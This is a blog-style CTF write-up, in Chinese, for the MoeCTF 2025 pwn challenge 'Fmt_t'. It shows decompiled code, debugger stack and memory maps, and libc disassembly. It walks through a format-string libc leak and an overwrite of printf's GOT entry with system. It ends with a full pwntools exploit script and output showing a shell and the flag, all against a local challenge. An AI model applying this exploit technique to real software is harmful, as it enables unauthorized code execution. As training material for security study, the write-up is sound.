---
title: 'XiDianCTF MoeCTF 2025 PWN Fmt_t'
date: '2026-09-19T09:54:02+08:00'
lastmod: '2026-09-19T09:54:02+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=891)

> `ELF`没有开启`PIE`。

反编译:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  fgets(s, 6, stdin);
  printf(s);
  puts("Anyone who uses format strings should be punished!\nGo to hell!");
  hell(5LL);
  return 0;
}
```

```c
unsigned __int64 __fastcall hell(int a1)
{
  char s[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v3; // [rsp+68h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("You've reached the level %d of hell.\n", (unsigned int)a1);
  if ( a1 <= 30 )
  {
    fgets(s, a1, stdin);
    hell((unsigned int)(a1 + 11));
    if ( (unsigned int)pd(s, a1) )
      printf(s);
  }
  else
  {
    puts("You've been swallowed by hell.");
  }
  return v3 - __readfsqword(0x28u);
}
```

```c
__int64 __fastcall pd(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 i; // [rsp+18h] [rbp-8h]

  for ( i = 0LL; i < a2; ++i )
  {
    if ( *(_BYTE *)(a1 + i) == 37 )
      return 1LL;
  }
  return 0LL;
}
```

注意到这里的`fmt`字符串是位于栈上的，所以我们可以在栈上自行构造`/bin/sh`和指针。

又注意到这里的递归是先从外到内构造`fmt`之后再从内到外执行，所以我们无法在内层泄露，需要我们使用`main()`的`fmt`来泄露`libc`。

观察栈:

```
00:0000│ rdi rsp 0x7fffffffd5f0 ◂— 0xa333231 /* '123\n' */
01:0008│-018     0x7fffffffd5f8 ◂— 0
02:0010│-010     0x7fffffffd600 ◂— 0
03:0018│-008     0x7fffffffd608 ◂— 0xbbcfd03b062d5700
04:0020│ rbp     0x7fffffffd610 ◂— 1
05:0028│+008     0x7fffffffd618 —▸ 0x7ffff7c29d90 ◂— mov edi, eax	<---在这里
06:0030│+010     0x7fffffffd620 ◂— 0
07:0038│+018     0x7fffffffd628 —▸ 0x4012fa (main) ◂— endbr64
08:0040│+020     0x7fffffffd630 ◂— 0x100000000
09:0048│+028     0x7fffffffd638 —▸ 0x7fffffffd728 —▸ 0x7fffffffd9fb ◂— '/path/to/pwn_patched'
0a:0050│+030     0x7fffffffd640 ◂— 0
0b:0058│+038     0x7fffffffd648 ◂— 0xcfb4384146873b72
0c:0060│+040     0x7fffffffd650 —▸ 0x7fffffffd728 —▸ 0x7fffffffd9fb ◂— '/path/to/pwn_patched'
0d:0068│+048     0x7fffffffd658 —▸ 0x4012fa (main) ◂— endbr64
0e:0070│+050     0x7fffffffd660 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401180 (__do_global_dtors_aux) ◂— endbr64
0f:0078│+058     0x7fffffffd668 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
10:0080│+060     0x7fffffffd670 ◂— 0x304bc7beeac53b72
11:0088│+068     0x7fffffffd678 ◂— 0x304bd7c47c0d3b72
12:0090│+070     0x7fffffffd680 ◂— 0x7fff00000000
13:0098│+078     0x7fffffffd688 ◂— 0
... ↓            3 skipped
17:00b8│+098     0x7fffffffd6a8 ◂— 0xbbcfd03b062d5700
18:00c0│+0a0     0x7fffffffd6b0 ◂— 0
19:00c8│+0a8     0x7fffffffd6b8 —▸ 0x7ffff7c29e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]
1a:00d0│+0b0     0x7fffffffd6c0 —▸ 0x7fffffffd738 —▸ 0x7fffffffda1e ◂— 'SHELL=/bin/bash'
1b:00d8│+0b8     0x7fffffffd6c8 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401180 (__do_global_dtors_aux) ◂— endbr64
1c:00e0│+0c0     0x7fffffffd6d0 —▸ 0x7ffff7ffe2e0 ◂— 0
1d:00e8│+0c8     0x7fffffffd6d8 ◂— 0
```

> 注意到`0x7ffff7c29d90`为`main()`的返回地址，`main()`会在`libc`中的`__libc_start_main`中调用后将其下一条汇编语句的地址写入`main()`的返回地址。
>
> ```
> LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
>              Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
>           0x3fe000           0x3ff000 rw-p     1000       0 pwn_patched
>           0x400000           0x401000 r--p     1000    2000 pwn_patched
>           0x401000           0x402000 r-xp     1000    3000 pwn_patched
>           0x402000           0x403000 r--p     1000    4000 pwn_patched
>           0x403000           0x404000 r--p     1000    4000 pwn_patched
>           0x404000           0x405000 rw-p     1000    5000 pwn_patched
>     0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 libc.so.6	<---在这里
>     0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000   28000 libc.so.6
>     0x7ffff7dbd000     0x7ffff7e15000 r--p    58000  1bd000 libc.so.6
>     0x7ffff7e15000     0x7ffff7e16000 ---p     1000  215000 libc.so.6
>     0x7ffff7e16000     0x7ffff7e1a000 r--p     4000  215000 libc.so.6
>     0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000  219000 libc.so.6
>     0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000       0 [anon_7ffff7e1c]
>     0x7ffff7fb8000     0x7ffff7fbd000 rw-p     5000       0 [anon_7ffff7fb8]
>     0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000       0 [vvar]
>     0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000       0 [vdso]
>     0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000       0 ld-linux-x86-64.so.2
>     0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000    2000 ld-linux-x86-64.so.2
>     0x7ffff7fef000     0x7ffff7ffa000 r--p     b000   2c000 ld-linux-x86-64.so.2
>     0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   37000 ld-linux-x86-64.so.2
>     0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   39000 ld-linux-x86-64.so.2
>     0x7ffffffdd000     0x7ffffffff000 rw-p    22000       0 [stack]
> ```
>
> 注意到返回地址`0x7ffff7c29d90`恰好处于`libc.so.6`的内存段。
>
> 偏移为`0x7ffff7c29d90 - 0x7ffff7c00000 = 0x29d90`。
>
> 反编译`libc.so.6`:
>
> ```assembly
> .text:0000000000029D10 ; =============== S U B R O U T I N E =======================================
> .text:0000000000029D10
> .text:0000000000029D10 ; Attributes: noreturn
> .text:0000000000029D10
> .text:0000000000029D10 ; void __fastcall __noreturn sub_29D10(unsigned int (__fastcall *)(_QWORD, __int64, char **), unsigned int, __int64)
> .text:0000000000029D10 sub_29D10       proc near               ; CODE XREF: __libc_start_main+7B↓p
> .text:0000000000029D10
> .text:0000000000029D10 var_90          = qword ptr -90h
> .text:0000000000029D10 var_84          = dword ptr -84h
> .text:0000000000029D10 var_80          = qword ptr -80h
> .text:0000000000029D10 var_78          = byte ptr -78h
> .text:0000000000029D10 var_30          = qword ptr -30h
> .text:0000000000029D10 var_28          = qword ptr -28h
> .text:0000000000029D10 var_10          = qword ptr -10h
> .text:0000000000029D10
> .text:0000000000029D10 ; __unwind {
> .text:0000000000029D10                 push    rax
> .text:0000000000029D11                 pop     rax
> .text:0000000000029D12                 sub     rsp, 98h
> .text:0000000000029D19                 mov     [rsp+98h+var_90], rdi
> .text:0000000000029D1E                 lea     rdi, [rsp+98h+var_78] ; env
> .text:0000000000029D23                 mov     [rsp+98h+var_84], esi
> .text:0000000000029D27                 mov     [rsp+98h+var_80], rdx
> .text:0000000000029D2C                 mov     rax, fs:28h
> .text:0000000000029D35                 mov     [rsp+98h+var_10], rax
> .text:0000000000029D3D                 xor     eax, eax
> .text:0000000000029D3F                 call    _setjmp
> .text:0000000000029D44                 endbr64
> .text:0000000000029D48                 test    eax, eax
> .text:0000000000029D4A                 jnz     short loc_29D97
> .text:0000000000029D4C                 mov     rax, fs:300h
> .text:0000000000029D55                 mov     [rsp+98h+var_30], rax
> .text:0000000000029D5A                 mov     rax, fs:2F8h
> .text:0000000000029D63                 mov     [rsp+98h+var_28], rax
> .text:0000000000029D68                 lea     rax, [rsp+98h+var_78]
> .text:0000000000029D6D                 mov     fs:300h, rax
> .text:0000000000029D76                 mov     rax, cs:environ_ptr
> .text:0000000000029D7D                 mov     edi, [rsp+98h+var_84]
> .text:0000000000029D81                 mov     rsi, [rsp+98h+var_80]
> .text:0000000000029D86                 mov     rdx, [rax]
> .text:0000000000029D89                 mov     rax, [rsp+98h+var_90]
> .text:0000000000029D8E                 call    rax
> .text:0000000000029D90                 mov     edi, eax		<---在这里
> .text:0000000000029D92
> .text:0000000000029D92 loc_29D92:                              ; CODE XREF: sub_29D10+AA↓j
> .text:0000000000029D92                 call    exit
> ```
>
> 到这里已经可以做题了，暂不继续深究。
>
> 我们可以泄露`main()`的返回地址来获取`libc.so.6`的基址来构造`fmt`。

当我们有了`libc.so.6`的基址，并且`ELF`没有开启`PIE`的情况下，我们可以着手准备修改`GOT`表了。

但我们缺少指向`GOT`表的指针，但是`fmt`是在栈上，可以在第二次递归时输入指针，并在第三次递归时`fmt`通过指针修改`GOT`。

选择修改`printf()`的`GOT`表，他是`hell()`三次递归后遇到的第一个`plt`函数，并且其参数恰好是`fgets()`写入的栈，我们可以在此写入`/bin/sh`参数。





`libc.so.6`中`printf`偏移为`0x606F0`，而`system()`偏移为`0x50D70`，我们需要修改至少两个字节`:(`。

> `fgets(buf, n, stdin)`只会读取**n - 1**字节，然后在后面添加`\n`。
>
> 如果程序使用`fgets()`，务必严格构造字符串并考虑其长度和末尾，防止下一次的`fgets()`读取到上次的输入！



Exp:

```python
from pwn import *
import ctypes
import shutil
import logging

pwndbg = shutil.which("pwndbg")
context(arch='amd64', os='linux', log_level='debug')
io = connect("127.0.0.1" ,58487)

io.send(b'%11$p')
io.recvuntil(b'0x')
retAdd = io.recv(12)
print(retAdd)
retAdd = int(retAdd, 16)
print(f"retAdd:{hex(retAdd)}")

libcAdd = retAdd -  0x29d90
print(f"libcAdd:{hex(libcAdd)}")

sysAdd = libcAdd + 0x50d70
print(f"sysAdd:{hex(sysAdd)}")

gotAdd = 0x404018

io.recvuntil(b'hell.\n');
io.send(b'sh\x00%')

io.recvuntil(b'hell.\n');
io.send(p64(gotAdd) + p64(gotAdd + 2)[:7])

low2 = sysAdd & 0xffff
low4 = (sysAdd >> 16) & 0xffff


io.recvuntil(b'hell.\n')
if(low2 > low4):
    io.send(f"%{low4}c%25$hn%{low2 - low4}c%24$hn\n".encode())
else:
    io.send(f"%{low2}c%24$hn%{low4 - low2}c%25$hn\n".encode())

io.interactive()
```

输出:

```
[x] Opening connection to 127.0.0.1 on port 58487
[x] Opening connection to 127.0.0.1 on port 58487: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 58487: Done
[DEBUG] Sent 0x5 bytes:
    b'%11$p'
[DEBUG] Received 0x71 bytes:
    b'0x7efdab61cd90Anyone who uses format strings should be punished!\n'
    b'Go to hell!\n'
    b"You've reached the level 5 of hell.\n"
b'7efdab61cd90'
retAdd:0x7efdab61cd90
libcAdd:0x7efdab5f3000
sysAdd:0x7efdab643d70
[DEBUG] Sent 0x4 bytes:
    00000000  73 68 00 25                                         │sh·%│
    00000004
[DEBUG] Received 0x25 bytes:
    b"You've reached the level 16 of hell.\n"
[DEBUG] Sent 0xf bytes:
    00000000  18 40 40 00  00 00 00 00  1a 40 40 00  00 00 00     │·@@·│····│·@@·│···│
    0000000f
[DEBUG] Received 0x25 bytes:
    b"You've reached the level 27 of hell.\n"
[DEBUG] Sent 0x1b bytes:
    b'%15728c%24$hn%28148c%25$hn\n'
[*] Switching to interactive mode
[DEBUG] Received 0x25 bytes:
    b"You've reached the level 38 of hell.\n"
You've reached the level 38 of hell.
[DEBUG] Received ...
$ ls
[DEBUG] Sent ...
[DEBUG] Received ...
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
$ cat flag
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 58487
```

